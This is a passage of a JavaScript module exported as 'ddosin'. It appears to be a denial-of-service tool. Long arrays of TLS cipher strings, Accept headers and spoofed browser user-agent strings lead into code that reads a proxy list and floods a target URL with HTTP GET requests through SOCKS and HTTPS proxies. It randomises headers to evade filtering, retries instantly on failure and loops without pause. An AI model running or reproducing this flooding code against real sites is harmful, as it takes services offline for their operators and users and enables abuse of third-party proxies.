  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
     "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
     "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
];
const acceptHeader = [
       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel"
];
const uap = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52',
    'Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52',
    'Mozilla/5.0 (Linux; Android 11; M2103K19PY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 YaApp_Android/21.85.1 YaSearchBrowser/21.85.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.3.940 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)',
    'Mozilla/5.0 (Linux; Android 11; SM-A125F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36 OPR/70.0.3728.178',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 YaBrowser/21.5.3.740 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.169 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.116 YaApp_Android/22.11.1 YaSearchBrowser/22.11.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; Android 11; RMX3201 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 OPR/78.0.4093.186',
    'Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; HRY-LX1 Build/HONORHRY-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.5.121.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 YaBrowser/21.11.7.183.10 SA/3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; HRY-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Prime) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 YaBrowser/21.5.3.742 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.113.1 YaSearchBrowser/21.113.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 YaApp_Android/21.80.1 YaSearchBrowser/21.80.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.169 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 YaBrowser/21.8.3.966.10 SA/3 TA/2.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 8.0.0; BV6800Pro_RU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.169 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 YaBrowser/19.5.2.38.10 YaApp_iOS/87.00 YaApp_iOS_Browser/87.00 Safari/604.1 SA/3 TA/2.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.4.727 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 YaApp_Android/21.82.1 YaSearchBrowser/21.82.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 11; Lenovo K12 Pro Build/RZCS31.Q2-57-12-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 Instagram 210.0.0.28.71 Android (30/11; 280dpi; 720x1526; lenovo/Lenovo; Lenovo K12 Pro; cebu; qcom; ru_RU; 326153491)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 YaBrowser/21.6.1.274 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.172 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; arm_64; Android 8.0.0; SM-A720F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaApp_Android/21.56.1 YaSearchBrowser/21.56.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 YaBrowser/21.5.3.740 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.4.730 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; arm_64; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaBrowser/21.5.3.120.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-N980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 YaBrowser/21.6.6.55.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; Android 9; ZB602KL Build/PKQ1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; AUM-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; M2010J19SG Build/QKQ1.200830.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.114.1 YaSearchBrowser/21.114.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.0.1996 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 11; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaApp_Android/21.51.1 YaSearchBrowser/21.51.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MagnitApp_iOS/2.0.9',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/90.0.4430.210 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; arm_64; Android 10; HRY-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaApp_Android/21.54.1 YaSearchBrowser/21.54.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; Android 8.0.0; AUM-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 YaBrowser/21.6.0.620 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 YaApp_Android/21.80.1 YaSearchBrowser/21.80.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm; Android 10; AQM-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 YaBrowser/21.8.1.138.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MagnitApp_iOS/1.4.9',
    'Mozilla/5.0 (Linux; arm; Android 10; AKA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.117.1 YaSearchBrowser/21.117.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm_64; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaBrowser/21.5.4.119.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Linux; arm_64; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 YaBrowser/21.8.1.127.00 SA/3 Mobile Safari/537.36 TA/7.1',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 YaBrowser/21.6.1.274 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 YaBrowser/21.6.0.616 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 6.0; CHM-U01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; JSN-L21 Build/HONORJSN-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36'
        ];

function readProxyList() {
  try {
    const data = fs.readFileSync(proxyListFile, 'utf8');
    return data.trim().split('\n').map(line => line.trim());
  } catch (error) {
    console.error(`Failed to read proxy list: ${error}`);
    return [];
  }
}

function readUserAgentList() {
  try {
    const data = fs.readFileSync(uaListFile, 'utf-8').replace(/\r/g, '').split('\n');
    return data.map(line => line.trim());
  } catch (error) {
    console.error(`Failed to read user agent list: ${error}`);
    return [];
  }
}

function sanitizeUserAgent(userAgent) {
  return userAgent.replace(/[^\x20-\x7E]/g, '');
}

function getRandomElement(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}
const proxyListFile = 'proxy.txt';
const uaListFile = 'ua.txt';
const delay = 0;

function sendRequest(target, agent, userAgent) {
    const sanitizedUserAgent = sanitizeUserAgent(getRandomElement(uap));

    const headers = {
      'User-Agent': sanitizedUserAgent,
      'Accept': getRandomElement(acceptHeader),
      'Accept-Encoding': getRandomElement(encodingHeader),
      'Accept-Language': getRandomElement(langHeader),
      'Referer': getRandomElement(refers),
      'Cache-Control': getRandomElement(cplist),
      'DNT': '1',
      'Connection': 'keep-alive',
      'Upgrade-Insecure-Requests': '1',
      'TE': 'Trailers',
    };

    axios.get(target, { httpAgent: agent, headers: headers, timeout: 0 })
      .then(response => {})
      .catch(error => {
        setTimeout(() => sendRequest(target, agent, userAgent), 0);
      });
}

function sendRequests() {
  const proxyList = readProxyList();
  const userAgentList = readUserAgentList();
  let currentIndex = 0;

  function sendRequestUsingNextProxy() {
    if (currentIndex < proxyList.length) {
      const proxyUrl = proxyList[currentIndex];
      const userAgent = userAgentList[Math.floor(Math.random() * userAgentList.length)];

      let agent;

      if (proxyUrl.startsWith('socks4') || proxyUrl.startsWith('socks5')) {
        agent = new SocksProxyAgent(proxyUrl);
      } else if (proxyUrl.startsWith('https')) {
        agent = new HttpsProxyAgent({ protocol: 'http', ...parseProxyUrl(proxyUrl) });
      }
 sendRequest(targetUrl, agent, userAgent);
      currentIndex++;
      setImmediate(sendRequestUsingNextProxy);
    } else {
      setTimeout(sendRequests, delay);
    }
  }
console.log(`
[!] Information [!]
===============================
Target: ${targetUrl}
Proxy List: ${proxyListFile}
==============================
`)
  sendRequestUsingNextProxy();
}

sendRequests();

}

module.exports = ddosin